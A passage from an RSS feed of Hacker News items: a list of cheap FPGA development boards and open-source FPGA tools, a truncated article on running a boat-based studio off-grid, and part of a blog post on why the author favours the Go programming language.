</li></ul><p>I like having a board with many (at least 8) SPST switches and LEDs, and momentary buttons. Unlike a microcontroller where it's relatively easy to spit debug information out of a serial port or to an LCD with a single C function call, debugging FPGA designs is a bit harder. LEDs  provide a zero fuss way to break out internal signals for visualisation - if you're tracking the progress of a complex state machine, you can light up an LED when it gets to a certain point without adding any extra logic. While these are easy enough to add yourself, I find that it's better to get a board that has them so that you don't waste valuable user IOs or waste time investigating failures caused by your terrible soldering skills.
</p>
<p>Some manufacturers promote a standard form factor for add-ons, notably Digilent with their very wide range of <a href="https://store.digilentinc.com/pmod-modules-connectors/">Pmods</a>, the Papilio One's <a href="http://papilio.cc/index.php?n=Papilio.Wings">Wings</a>, and Arduino shields.
</p>
<p>If you would like to connect high speed devices (above 10-20 MHz) to your FPGA, make sure your board has an interface connector that supports the speeds you'll be using. Look for ground wires interspersed regularly between signal wires, high speed connectors (not just 0.1" headers), PCB trace length equalisation, and impedance control. Few of the cheap boards bother with any of these.
</p>
<p>FPGAs can be a bit daunting, so check that the manufacturer provides:
</p>
<ul><li>Schematic diagram
</li><li>A reference manual, describing all of the on-board peripherals
</li><li>A guide to getting started, if you've never used an FPGA before
</li><li>A reference design that exercises all on-board peripherals.
</li></ul><p>Reference designs can either be HDL or microcontroller-based, but in recent boards, most manufacturers seem to be moving to the latter. Bear this in mind if you don't have a license for the microcontroller and environment (e.g. Xilinx EDK/SDK is not free), as the code will be difficult to port to HDL.
</p>
<p>If you're a beginner, you may benefit from buying a board that has a companion textbook which has been written specifically for the board in mind, and describes each of the peripherals and how to interface with them. Popular boards with larger user communities may also be worth considering above cheaper options. The most popular Xilinx boards are those made by Xilinx (none of them cheap enough to be listed here), Digilent and Avnet. Terasic seem to make the most popular Altera boards.
</p>

<p>A long-standing complaint with vendor FPGA design tools is that they are generally enormous, complicated, slow, buggy, closed source, and are either expensive or have annoying license requirements. The open source community has made great progress in recent years to reimplement parts or all of the FPGA design toolchain and to address all of these concerns.
</p>
<p>FPGA devices which are currently either partially or fully supported by open source tools include:
</p>
<ul><li>Xilinx Spartan 6
</li><li>Xilinx Series 7 (Artix 7, Kintex 7, Virtex 7, Zynq with Series 7 Fabric)
</li><li>Xilinx Ultrascale(+)
</li><li>Lattice iCE40
</li><li>Lattice ECP5
</li><li>QuickLogic EOS S3 and PolarPro3
</li></ul><p>Some tools to check out include:
</p>
<ul><li><a href="https://github.com/enjoy-digital/litex">LiteX</a> - A Python-based SoC builder
<ul><li><a href="https://github.com/litex-hub">LiteX Hub</a> - collaborative FPGA projects based on LiteX
</li><li><a href="https://github.com/timvideos/litex-buildenv">LiteX-BuildEnv</a> - An environment for building LiteX-based FPGA designs
</li></ul></li><li><a href="http://www.clifford.at/yosys/">Yosys</a> - Verilog synthesis tool
</li><li><a href="https://github.com/YosysHQ/nextpnr">nextpnr</a> - a vendor neutral, timing driven place and route tool
</li><li><a href="https://symbiflow.github.io/">SymbiFlow</a> - an umbrella project for FPGA architecture definitions
</li><li><a href="https://icestudio.io/">Icestudio</a> - an visual editor/IDE for Lattice FPGAs
</li></ul><p><a href="https://twitter.com/mithro">Tim 'mithro' Ansell</a> has an open offer to send FPGA hardware to anyone who has time to to contribute to open source FPGA projects but doesn't have any hardware.
</p>

<h4>Xilinx</h4>
<h5>Zynq</h5>
<p>Xilinx's Zynq parts are supported by their Vivado high level synthesis design suite and include a dual-core ARM Cortex-A9, USB 2.0, and Gigabit Ethernet.
</p>

<table><tbody><tr><th>Name</th><th>Price</th><th>Device</th><th>Notes</th></tr>
<tr><td><a href="https://www.aliexpress.com/item/4000042572307.html">Zynq 7000 ZYNQ7010 development board</a></td><td>$42</td><td>Zynq 7010</td><td>A no-name board, apparently pulled from some equipment, which provides 256MB DDR, 128M NAND flash, SD card, optocoupled inputs, 1 button, 2 LEDs, and 42 I/Os. Some more information is available in this <a href="https://www.eevblog.com/forum/fpga/anyone-played-with-these-cheap-$50-zynq-boards/">EEVBlog thread</a>.</td></tr>
<tr><td><a href="https://www.aliexpress.com/item/4000323573953.html">QMTECH Zynq7000 Starter Kit</a></td><td>$56</td><td>Zynq 7010</td><td>512MB DDR3, micro SD slot, 100 Mbit Ethernet, two LEDs, 62 length-matched and paired FPGA I/Os and 15 processor I/Os. Some documentation is available at <a href="http://www.chinaqmtech.com/xilinx_zynq_soc">QMTech's site</a> and there are some observations in this <a href="https://www.eevblog.com/forum/fpga/anyone-played-with-these-cheap-$50-zynq-boards/">EEVBlog thread</a>, where there are some complaints about a lack of decoupling.</td></tr>
<tr><td><a href="http://shop.trenz-electronic.de/en/TE0722-01-DIPFORTy1-Soft-Propeller">DIPFORTy1 "Soft Propeller"</a></td><td>EUR 59</td><td>Zynq 7010</td><td>A DIP-40 sized board that is designed to be pin-compatible with the Parallax Propeller chip. It has 16MB of flash, 46 I/Os, one RGB LED, one user LED, micro SD socket, and a proximity/light sensor.</td></tr>
<tr><td><a href="https://world.taobao.com/item/607165559105.htm?spm=a21wu.11804641-tw.0.0.4263253ekAFbba">Sipeed Tang Hex</a></td><td>$70-90</td><td>Zynq 7020</td><td>1 GB LPDDR3, 2Gb Flash NAND, 100Mbit Ethernet, four USB 2.0 ports, a TF slot, and 15 GPIOs.</td></tr>
<tr><td><a href="http://zedboard.org/product/minized">MiniZed</a></td><td>$89</td><td>Zynq 7Z007S</td><td>Includes a single ARM A9, 512MB DDR3L, 128Mb flash and 8GB eMMC, USB host, USB-JTAG, and USB-UART, 802.11b/g/n Wi-Fi, Bluetooth 4.1, and BLE, Arduino shield connector and two PMODs (38 total I/Os), accelerometer, temperature, and MEMS microphone sensors, one button, one switch, and two bi-color LEDs</td></tr>
<tr><td><a href="http://www.myirtech.com/list.asp?id=502">MYIR Z-turn Board</a></td><td>$99/$119</td><td>Zynq 7010/ 7020</td><td>1GB DDR, 16MB flash, TF socket, gigabit Ethernet, CAN, USB2.0 OTG, USB-UART, HDMI output, 90 or 106 user I/Os (with 39 LVDS pairs), accelerometer and temperature sensor, JTGA, two buttons, 4 switches, four LEDs, and a buzzer. An "IO Cape" breakout board ($35) provides three Pmod connectors, camera and LCD connectors, and 0.1" header I/O pins.</td></tr>
<tr><td><a href="https://www.crowdsupply.com/krtkl/snickerdoodle">snickerdoodle</a></td><td>$115/$245</td><td>Zynq 7010/7020</td><td>A Zynq board with 155-180 I/Os, 512MB-1GB DDR, 16MB flash, micro SD, 802.11n WiFi, and Bluetooth 4.0. A range of base-boards and add-on boards are also available, providing gigabit Ethernet, HDMI in/out, USB, JTAG, 0.1" I/Os, and more.</td></tr>
<tr><td><a href="http://www.tul.com.tw/ProductsPYNQ-Z2.html">PYNQ Z2</a></td><td>$119</td><td>Zynq 7020</td><td>512MB DDR3, 128 Mb flash, microSD, gigabit Ethernet, HDMI source and sink, USB for JTAG, UART and OTG host, I2S audio I/O, 4 SPST buttons, 2 SPDT switches, 4 LEDs and 2 RGB LEDs, two PMODs, and Arduino and Raspberry Pi connectors (around 60 I/Os, plus 6 analog inputs)</td></tr>
<tr><td><a href="http://www.parallella.org/buy/">Parallella-16 Micro-Server</a></td><td>$126</td><td>Zynq 7010</td><td>Includes a dual ARM A9. Also available on the board are the Epiphany 16-core CPU Accelerator, 1GB RAM, 126 Mb flash, micro SD, and gigabit Ethernet.</td></tr>
<tr><td><a href="http://www.parallella.org/buy/">Parallella-16 Desktop</a></td><td>$158</td><td>Zynq 7010</td><td>Expands on the Micro-Server and adds high speed expansion ports with 24 GPIOs (and other Epiphany signals), HDMI, and USB 2.0 host.</td></tr>
<tr><td><a href="https://store.digilentinc.com/zybo-z7-zynq-7000-arm-fpga-soc-development-board/">Digilent ZYBO Z7</a></td><td>$199/299</td><td>Zynq 7010/7020</td><td>1GB DDR3 RAM, HDMI source/sink with CEC, VGA, gigabit Ethernet, USB JTAG, UART and 2.0 host/OTG, MIPI CSI-2, audio I/O, 6 buttons, 4 switches, 6 or 7 LEDs, and 40 I/Os (5 PMODs), including analogue inputs, and microSD</td></tr>
<tr><td><a href="http://www.zedboard.org/product/microzed">MicroZed</a></td><td>$199</td><td>Zynq 7010</td><td>1GB, 128 Mb flash, SD card, gigabit Ethernet, USB 2.0, 100 I/Os (48 LVDS pairs) and 2 PMODs, 1 LED and 1 switch</td></tr>
<tr><td><a href="https://allaboutfpga.com/product/edge-zynq-soc-fpga-development-board/">EDGE ZYNQ</a></td><td>$214</td><td>Zynq 7010</td><td>512MB, 128 Mb flash, micro SD, gigabit Ethernet, 802.11/b/g/n WiFi and Bluetooth 4.2/LE, USB for JTAG, UART, and OTG, HDMI Tx/Rx, VGA, stereo audio output, light and temperature sensors, 4*7 Seg LEDs, 5 LEDs, 4 slide switches, 31 PL I/Os and 4 PS I/Os. A 2x16 LCD module is included, and camera and TFT LCD modules are available.</td></tr>
</tbody></table>
<h5>Artix-7</h5>
<p>Artix parts are becoming increasingly common in inexpensive development boards, taking the position previously occupied by the Spartan-6 in Xilinx's lineup, though they are only supplied in BGA packages.
</p>

<table><tbody><tr><th>Name</th><th>Price</th><th>Device</th><th>Notes</th></tr>
<tr><td>QMTECH Artix 7 DDR3 Core Board</td><td>$50/80</td><td><a href="https://www.aliexpress.com/item/1000006630084.html">Artix 35T</a>/<a href="https://www.aliexpress.com/item/4000170003461.html">100T</a></td><td>256MB DDR3, 16MB SPI flash, 2 switches, 3 LEDs, JTAG header, and 108 length-matched I/Os. It's also compatible with a daughterboard which provides PMODs, USB-UART, camera interface, VGA, gigabit Ethernet, and more. There are reports that decoupling is insufficient, so beware.</td></tr>
<tr><td><a href="http://store.digilentinc.com/cmod-a7-breadboardable-artix-7-fpga-module/">Digilent Cmod A7</a></td><td>$75/89</td><td>Artix 15T/45T</td><td>A breadboardable module with 512KB SRAM, 4MB SPI flash, USB-JTAG and USB-Serial, 3 LEDs, 2 buttons, 52 digital I/Os, and 2 analog inputs.</td></tr>
<tr><td><a href="https://perfv.org/">Perf-V</a></td><td>$79</td><td>Artix 35T</td><td>4 switches, 5 buttons, 7 LEDs, JTAG 256MB DDR3, 16MB flash, Arduino shield connector, one PMOD, and some sort of high speed connector which supports expansion boards with HDMI and VGA. Larger FPGA sizes will apparently be available too.</td></tr>
<tr><td><a href="https://rhsresearch.com/collections/all/products/litefury">LiteFury</a></td><td>$99</td><td>Artix 100T</td><td>A PCIe x4 gen 2 development board with an NVMe (2280 Key M) connector. It has 256MB DDR3, 128 Mb flash, 4 LEDs, and 12 I/Os (including four LVDS pairs).</td></tr>
<tr><td><a href="https://alchitry.com/collections/all/products/alchitry-au-fpga-development-board">Alchitry Au</a></td><td>$99.99</td><td>Artix 35T</td><td>256MB DDR3, 102 digital I/Os, 9 differential analog inputs (8 shared with digital I/O), 8 LEDs, 1 button, USB-UART, and USB-C for power and programming. It has high density I/O connectors, but companion prototype/breaking ($10) and I/O with switches, LEDs, 7-Segs ($25) boards.</td></tr>
<tr><td><a href="https://www.aliexpress.com/item/4000170042795.html">QMTECH Artix-7 Wukong Board</a></td><td>$100</td><td>Artix 100T</td><td>16MB flash, 256MB DDR3, 3 switches, 4 LEDs, gigabit Ethernet, HDMI output, USB-UART, GTP transceiver interface, 2 PMODs, and 40 I/IOs. There are reports that decoupling is insufficient, so beware.</td></tr>
<tr><td><a href="https://store.digilentinc.com/arty-a7-artix-7-fpga-development-board-for-makers-and-hobbyists/">Arty A7</a></td><td>$129/249</td><td>Artix 35T/100T</td><td>An inexpensive way to get into the Artix parts. It provides 256 MB DDR, 16MB flash, 10/100 Ethernet, USB-UART/JTAG, four PMODs, an Arduino shield connector (a total of 62 I/Os?), 4 switches, 4 buttons, 8 LEDs (4 of them RGB), and a one year licence for Vivado Design Edition.</td></tr>
<tr><td><a href="https://numato.com/product/mimas-a7-artix-7-fpga-development-board-with-ddr-sdram-and-gigabit-ethernet">N…</a></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.joelw.id.au/FPGA/CheapFPGADevelopmentBoards">https://www.joelw.id.au/FPGA/CheapFPGADevelopmentBoards</a></em></p>]]>
            </description>
            <link>https://www.joelw.id.au/FPGA/CheapFPGADevelopmentBoards</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723893</guid>
            <pubDate>Mon, 11 Jan 2021 03:09:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Working Off-Grid Efficiently]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25723819">thread link</a>) | @zdw
<br/>
January 10, 2021 | https://100r.co/site/working_offgrid_efficiently.html | <a href="https://web.archive.org/web/*/https://100r.co/site/working_offgrid_efficiently.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
        
        <ul>
            <li><a href="#intro">Introduction</a></li>
            <li><a href="#power">Power management</a></li>
            <li><a href="#internet">Internet</a></li>
            <li><a href="#data">Data storage</a></li>
            <li><a href="#software">Software</a></li>
            <li><a href="#hardware">Hardware</a></li>
            <li><a href="#conscientious">Conscientious living</a></li>
        </ul>
<h2 id="intro">Introduction</h2>

<img src="https://100r.co/media/blog/working/dworking5.jpg" loading="lazy">

<p>Our traveling studio has operated off-the-grid since 2016.</p>

<p>For the first 3 years we tested the limits of our space, and at first, it was difficult to create new things, as we had to make time to learn how to solve the underlying problems. Our boat was not just an office, it was also our house and transport. As for us, we were artists, but also had to be plumbers, deckhands, electricians, captains, janitors and accountants.</p>

<p>Our main problems as a studio were <b>internet scarcity</b>, <b>power management</b>, <b>data storage</b> as well as <b>hardware</b> and <b>software failures</b>. Overtime we found ways to balance work, pleasure and maintenance. Here are some of the lessons we learnt.</p>

<h2 id="power">Power management</h2>

<img src="https://100r.co/media/blog/working/dworking6.jpg" loading="lazy">

<p>Our work schedule is tied to the weather, as we depend on solar energy to power our computers. By looking at the forecast, we can determine when we will get the most work done: consecutive days of sun grant us enough power for video-editing, while overcast days are reserved for low-power work, like writing, coding and planning.</p>

<p>There are times when we must resort to secondary power sources, like our small generator or our engine's alternator, but we tend to prefer to <a href="https://www.youtube.com/watch?v=9ua_qxjbBTc">wait for the sun to return</a>. Waiting hasn’t affected our productivity, as we don't adhere to strict 8-hour workdays.</p>

<p>We tend to work only in the morning, leaving us time to pursue other interests in the afternoon. In our old life, we found that the 40-hour workweek ﻿<a href="https://www.raptitude.com/2010/07/your-lifestyle-has-already-been-designed/" target="_blank">kept free-time scarce</a>, resulting in us spending more for convenience, gratification and distraction.</p>

<p>Computers are generally power-sucking vampires. Choosing different softwares, operating systems, or working from machines with a lower draw (ARM) or even throttling the CPU, are some of the many things we do to lower our power requirements. The way that software is built has a substantial impact on the power consumption of a system, it is shocking how cpu-intensive modern programs can be.</p>

<p>Choosing software designed for low-end PCs is a good solution, it is also possible to throttle processes on your machine by using a ‘throttling controller’. The basic idea is like the throttle in a car, it allows to set the rate at which your system will operate and consume power. Another sure way to save battery is to limit multitasking. Disabling notifications, <a href="https://addons.mozilla.org/en-CA/firefox/addon/noscript/">scripts</a>, auto-playing videos or using internet browsers without opening multiple tabs at once are some of the many ways to achieve this.</p>

<p>Power consumption is also something to consider when choosing a computer. In evenings, if we need to work on light tasks, we switch to our low-power machines like the <a href="https://100r.co/site/raspberry_pi.html">Raspberry Pi</a>. To illustrate the difference in power draw, a Pi4 uses 2.85 W when idle, while a Macbook Pro uses 6-12 W. Raspberry Pis are backups to our main computers, as they are inexpensive and can run off small batteries.</p>

<h2 id="internet">Internet</h2>

<img src="https://100r.co/media/blog/working/dworking1.jpg" loading="lazy">

<p>Internet access is the woe of any working nomad. Internet is sometimes spotty, and data in some countries is slow, expensive, or limited to small blocks at a time. While circumnavigating the Pacific, we amassed sim cards, pocket WiFis, and have often used connections from businesses on land. Overtime, we found ways to lessen our dependence on internet, and to save on bandwidth.</p>

<p>With limited access, it is important to use online time wisely. Prior to connecting we make a list of tasks that we must do, such as pushing updates and making backups of our data online. It’s easy to get side-tracked on the internet, with websites designed to grab and keep our attention. When checking social media, we disable auto-playing videos and image previews to save bandwidth.</p>

<p>When we have a reliable internet connection, we gather copies of all the online material we will need. We keep offline versions of entire websites, writing guides, articles and even whole sections of Wikipedia. If we find ourselves without a connection, we can still solve our problems by using our offline mirrors. By the way, you can <a href="https://github.com/hundredrabbits/100r.co/archive/master.zip">download our entire website</a>.</p>

<p>We research our destinations ahead of time to make sure we’ll have a reliable connection when we need it. This means we’ll be spending less time in secluded areas, and more time in city centers near a cell tower or WiFi signal. With some planning it is possible to have both paradise and connectivity, we found such a place in <a href="https://100r.co/site/internet_in_paradise.html#internet">Huahine</a> in French Polynesia, and again in Fiji. Internet access will only get better as far-flung island nations gain purchasing power.</p>

<h2 id="data">Data storage</h2>

<img src="https://100r.co/media/blog/working/dworking2.jpg" loading="lazy">

<p>Hardware failure is common on boats due to the hostile environment. Saltwater is the kryptonite of electronics. This is why it is important to backup data often to avoid losing work. There are advantages and disadvantages with all methods of data storage, but I’ll outline the most useful ones for sailors:</p>

<p><b>Cloud storage:</b> For a fee, you can back up your data online and sync files from your desktop. This method doesn’t eliminate physical storage as data can’t be synced to the cloud without a connection. Offloading data storage to a centralized service is problematic in other ways, because services have rules and owners and processes which can complicate things. For instance, country politics have made it that Google restricts access to some of its business services in certain countries or regions, such as China, Crimea, Cuba, Iran, Sudan, and Syria. Whatever data you have stored with Google Drive, if traveling to any of these countries will not be accessible. As conflicts arise, more countries can end up on that list. We keep documents we don’t need regular access to on the cloud, with copies on hard disks.</p>

<p><b>Hard copies:</b> Paper is a stable and widely accessible material, unlike digital devices which are subject to breakages and obsolescence. There’s a good reason books and other documents from centuries ago are still readable today. We like to keep printed copies of websites and other online reference materials, such as grammar guides for writing, or language manuals for coding. Keeping data like this means we always have access and aren’t limited to our computer’s battery.</p>

<p><b>External hard drives:</b> A hard drive is the best balance of practical and reliable for storage. However, hard drives are rated for a limited number of read/write cycles, and can be expected to fail eventually. To prevent data loss due to HD failure, it’s a good idea to store the same data across multiple hard drives.</p>

<p><b>Offline databases:</b> Keeping an offline collection of websites on computers or HD ensures constant access, and reduces the energy associated with re-loading them repeatedly. It’s possible to save web pages with most browser by selecting File &gt; Save Page As. To access the page offline, click on the HTML file. Another option is to mirror entire web sites using <a href="https://www.gnu.org/software/wget/" target="_blank">command-line tools</a>. We keep offline databases full of notes on a variety of subjects to refer to when there’s no internet.</p>

<p>Keeping files on the cloud, on hard drives and hard copies gives our floating studio the redundancy required to ensure reliability.</p>

<h2 id="software">Software</h2>

<p>Software has a big impact on productivity, they need to be reliable and fast. Those that require heavy updates, that have a high CPU usage and that need frequent connectivity to function are problematic for working sailors.</p>

<p>Much of the software on the market is designed by people living on the grid with unlimited access to internet. Tools locking up at sea, asking for a connection to continue working don’t float on a boat. Adobe products are a good example, as they require an internet connection periodically for subscription validation. If away from big cities, you may open your computer in an atoll to find that you no longer have access to the tool you need to get things done. Choosing a tool that doesn’t require a subscription is <b>essential</b> for working nomads that don’t have a reliable connection.</p>

<p>In our first year, we struggled to download the frequent and mandatory 10GB software updates from Apple to release our software on their platform, while on slow Polynesian internet. Processor-intensive software or apps is a strain on limited power and bandwidth, but it doesn’t have to be that way. The way developers write them can affect the power consumption of the resulting product. Chat rooms and bare bones text editors aren’t supposed to be process-heavy, and yet the popular communication platform Slack requires <a href="https://josephg.com/blog/electron-is-flash-for-the-desktop/" target="_blank">outrageous amounts of ram and CPU</a> to function. This is because Slack is embedding the entirety of Google Chrome in their app. Making software this way is costly to off-grid users, or those on slow connections, but luckily there are <a href="https://github.com/mayfrost/guides/blob/master/ALTERNATIVES.md" target="_blank">many alternatives</a>.</p>

<p>Our computer batteries should not need to grow ever larger only to support these bloatwares, nor should we need to add extra solar to power them. Just as you would look at the nutritional content of food products at the grocery store, find out how much energy your apps are consuming.</p>

<h2 id="hardware">Hardware</h2>

<img src="https://100r.co/media/blog/working/working3.jpg" loading="lazy">

<p>Computers are subject to water intrusion and saltwater corrosion, but with some care they can survive in a normal marine environment. We solved most of the problems by cleaning external connections often, and by storing them in a sealed box with some desiccants after each use. The main issue with computers on boats, is that it is difficult to source parts when they break. To make matters worse, many modern machines have non-replaceable batteries, proprietary storage, and soldered-in RAM. The parts that fail the most are power connectors, external connections and batteries.</p>

<p>Leaving a port with spare parts is a good tactic, but leaving with backup PCs is even better. There are many good inexpensive computers on the market, like notebook processors (Pinebook, EeeBook) and single-board computers (Raspberry Pis, Pine64). We carry 3 extra Raspberry Pi computers as backups to our main laptops, as they are inexpensive and small. These computers run on lower voltage, which lower overall …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://100r.co/site/working_offgrid_efficiently.html">https://100r.co/site/working_offgrid_efficiently.html</a></em></p>]]>
            </description>
            <link>https://100r.co/site/working_offgrid_efficiently.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25723819</guid>
            <pubDate>Mon, 11 Jan 2021 02:58:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Go is my favorite programming language (2017)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723749">thread link</a>) | @psxuaw
<br/>
January 10, 2021 | https://michael.stapelberg.ch/posts/2017-08-19-golang_favorite/ | <a href="https://web.archive.org/web/*/https://michael.stapelberg.ch/posts/2017-08-19-golang_favorite/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
  
  <details>
    <summary>Table of contents</summary>
    <nav>
<ul>
<li>
<ul>
<li><a href="#my-background">My background</a></li>
<li><a href="#1-clarity">1. Clarity</a>
<ul>
<li><a href="#formatting">Formatting</a></li>
<li><a href="#high-quality-code">High-quality code</a></li>
<li><a href="#opinions">Opinions</a></li>
<li><a href="#few-keywords-and-abstraction-layers">Few keywords and abstraction layers</a></li>
</ul></li>
<li><a href="#2-speed">2. Speed</a>
<ul>
<li><a href="#quick-feedback-low-latency">Quick feedback / low latency</a></li>
<li><a href="#maximum-resource-usage">Maximum resource usage</a></li>
</ul></li>
<li><a href="#3-rich-standard-library">3. Rich standard library</a></li>
<li><a href="#4-tooling">4. Tooling</a></li>
<li><a href="#getting-started">Getting started</a></li>
<li><a href="#caveats">Caveats</a></li>
</ul></li>
</ul>
</nav>
  </details>
  

<p>I strive to respect everybody’s personal preferences, so I usually steer clear
of debates about which is the best programming language, text editor or
operating system.</p>

<p>However, recently I was asked a couple of times why I like and use a lot of <a href="https://golang.org/">Go</a>, so here is a coherent article to fill in the
blanks of my ad-hoc in-person ramblings :-).</p>

<h2 id="my-background">My background</h2>

<p>I have used C and Perl for a number of decently sized projects. I have written
programs in Python, Ruby, C++, CHICKEN Scheme, Emacs Lisp, Rust and Java (for
Android only). I understand a bit of Lua, PHP, Erlang and Haskell. In a previous
life, I developed a number of programs using
<a href="https://en.wikipedia.org/wiki/Delphi_(programming_language)">Delphi</a>.</p>

<p>I had a brief look at Go in 2009, when it was first released. I seriously
started using the language when Go 1.0 was released in 2012, featuring the <a href="https://golang.org/doc/go1compat">Go 1
compatibility guarantee</a>. I still have
<a href="https://github.com/stapelberg/greetbot">code</a> running in production which I
authored in 2012, largely untouched.</p>

<h2 id="1-clarity">1. Clarity</h2>

<h3 id="formatting">Formatting</h3>

<p>Go code, by convention, is formatted using the
<a href="https://golang.org/cmd/gofmt/"><code>gofmt</code></a> tool. Programmatically formatting code
is not a new idea, but contrary to its predecessors, <code>gofmt</code> supports precisely
one canonical style.</p>

<p>Having all code formatted the same way makes reading code easier; the code feels
familiar. This helps not only when reading the standard library or Go compiler,
but also when working with many code bases — think Open Source, or big
companies.</p>

<p>Further, auto-formatting is a huge time-saver during code reviews, as it
eliminates an entire dimension in which code could be reviewed before: now, you
can just let your continuous integration system verify that <code>gofmt</code> produces no
diffs.</p>

<p>Interestingly enough, having my editor apply <code>gofmt</code> when saving a file has
changed the way I write code. I used to attempt to match what the formatter
would enforce, then have it correct my mistakes. Nowadays, I express my thought
as quickly as possible and trust <code>gofmt</code> to make it pretty
(<a href="https://play.golang.org/p/I6GJwiT77v">example</a> of what I would type, click
Format).</p>

<h3 id="high-quality-code">High-quality code</h3>

<p>I use the standard library (<a href="https://golang.org/pkg/">docs</a>,
<a href="https://github.com/golang/go/tree/master/src">source</a>) quite a bit, see below.</p>

<p>All standard library code which I have read so far was of extremely high quality.</p>

<p>One example is the <a href="https://golang.org/pkg/image/jpeg/"><code>image/jpeg</code></a> package: I
didn’t know how JPEG worked at the time, but it was easy to pick up by switching
between the <a href="https://en.wikipedia.org/wiki/JPEG">Wikipedia JPEG article</a> and the
<code>image/jpeg</code> code. If the package had a few more comments, I would qualify it as
a teaching implementation.</p>

<h3 id="opinions">Opinions</h3>

<p>I have come to agree with many opinions the Go community holds, such as:</p>

<ul>
<li><a href="https://github.com/golang/go/wiki/CodeReviewComments#variable-names">Variable names</a> should be short by default, and become more descriptive the further from its declaration a name is used.</li>
<li>Keep the dependency tree small (to a reasonable degree): <a href="https://www.youtube.com/watch?v=PAAkCSZUG1c&amp;t=9m28s">a little copying is better than a little dependency</a></li>
<li>There is a cost to introducing an abstraction layer. Go code is usually rather clear, at the cost of being a bit repetitive at times.</li>
<li>See <a href="https://github.com/golang/go/wiki/CodeReviewComments">CodeReviewComments</a> and <a href="https://go-proverbs.github.io/">Go Proverbs</a> for more.</li>
</ul>

<h3 id="few-keywords-and-abstraction-layers">Few keywords and abstraction layers</h3>

<p>The Go specification lists only <a href="https://golang.org/ref/spec#Keywords">25
keywords</a>, which I can easily keep in my
head.</p>

<p>The same is true for <a href="https://golang.org/pkg/builtin/">builtin functions</a> and
<a href="https://golang.org/ref/spec#Types">types</a>.</p>

<p>In my experience, the small number of abstraction layers and concepts makes the
language easy to pick up and quickly feel comfortable in.</p>

<p>While we’re talking about it: I was surprised about how readable the <a href="https://golang.org/ref/spec">Go
specification</a> is. It really seems to target
programmers (rather than standards committees?).</p>

<h2 id="2-speed">2. Speed</h2>

<h3 id="quick-feedback-low-latency">Quick feedback / low latency</h3>

<p>I love quick feedback: I appreciate websites which load quickly, I prefer fluent
User Interfaces which don’t lag, and I will choose a quick tool over a more
powerful tool any day. <a href="https://blog.gigaspaces.com/amazon-found-every-100ms-of-latency-cost-them-1-in-sales/">The
findings</a>
of large web properties confirm that this behavior is shared by many.</p>

<p>The authors of the Go compiler respect my desire for low latency: compilation
speed matters to them, and new optimizations are carefully weighed against
whether they will slow down compilation.</p>

<p>A friend of mine had not used Go before. After installing the
<a href="https://robustirc.net/">RobustIRC</a> bridge using <code>go get</code>, they concluded that Go
must be an interpreted language and I had to correct them: no, the Go compiler
just is that fast.</p>

<p>Most Go tools are no exception, e.g. <code>gofmt</code> or <code>goimports</code> are blazingly fast.</p>

<h3 id="maximum-resource-usage">Maximum resource usage</h3>

<p>For batch applications (as opposed to interactive applications), utilizing the
available resources to their fullest is usually more important than low latency.</p>

<p>It is delightfully easy to profile and change a Go program to utilize all
available IOPS, network bandwidth or compute. As an example, I wrote about
<a href="https://people.debian.org/~stapelberg/2014/01/17/debmirror-rackspace.html">filling a 1 Gbps
link</a>,
and optimized <a href="https://github.com/Debian/debiman/">debiman</a> to utilize all
available resources, reducing its runtime by hours.</p>

<h2 id="3-rich-standard-library">3. Rich standard library</h2>

<p>The <a href="https://golang.org/pkg">Go standard library</a> provides means to effectively
use common communications protocols and data storage formats/mechanisms, such as
TCP/IP, HTTP, JPEG, SQL, …</p>

<p>Go’s standard library is the best one I have ever seen. I perceive it as
well-organized, clean, small, yet comprehensive: I often find it possible to
write reasonably sized programs with just the standard library, plus one or two
external packages.</p>

<p>Domain-specific data types and algorithms are (in general) not included and live
outside the standard library,
e.g. <a href="https://godoc.org/golang.org/x/net/html"><code>golang.org/x/net/html</code></a>. The
<code>golang.org/x</code> namespace also serves as a staging area for new code before it
enters the standard library: the Go 1 compatibility guarantee precludes any
breaking changes, even if they are clearly worthwhile. A prominent example is
<code>golang.org/x/crypto/ssh</code>, which had to break existing code to <a href="https://github.com/golang/crypto/commit/e4e2799dd7aab89f583e1d898300d96367750991">establish a more
secure
default</a>.</p>



<p>To download, compile, install and update Go packages, I use the <code>go get</code> tool.</p>

<p>All Go code bases I have worked with use the built-in
<a href="https://golang.org/pkg/testing/"><code>testing</code></a> facilities. This results not only
in easy and fast testing, but also in <a href="https://blog.golang.org/cover">coverage
reports</a> being readily available.</p>

<p>Whenever a program uses more resources than expected, I fire up <code>pprof</code>. See
this <a href="https://blog.golang.org/profiling-go-programs">golang.org blog post about
<code>pprof</code></a> for an introduction, or
<a href="https://people.debian.org/~stapelberg/2014/12/23/code-search-taming-the-latency-tail.html">my blog post about optimizing Debian Code
Search</a>. After
importing the <a href="https://golang.org/pkg/net/http/pprof/"><code>net/http/pprof</code>
package</a>, you can profile your server
while it’s running, without recompilation or restarting.</p>

<p>Cross-compilation is as easy as setting the <code>GOARCH</code> environment variable,
e.g. <code>GOARCH=arm64</code> for targeting the Raspberry Pi 3. Notably, tools just work
cross-platform, too! For example, I can profile <a href="https://gokrazy.org/">gokrazy</a>
from my amd64 computer: <code>go tool pprof ~/go/bin/linux_arm64/dhcp
http://gokrazy:3112/debug/pprof/heap</code>.</p>

<p><a href="https://godoc.org/golang.org/x/tools/cmd/godoc">godoc</a> displays documentation
as plain text or serves it via HTTP. <a href="https://godoc.org/">godoc.org</a> is a public
instance, but I run a local one to use while offline or for not yet published
packages.</p>

<p>Note that these are standard tools coming with the language. Coming from C, each
of the above would be a significant feat to accomplish. In Go, we take them for
granted.</p>

<h2 id="getting-started">Getting started</h2>

<p>Hopefully I was able to convey why I’m happy working with Go.</p>

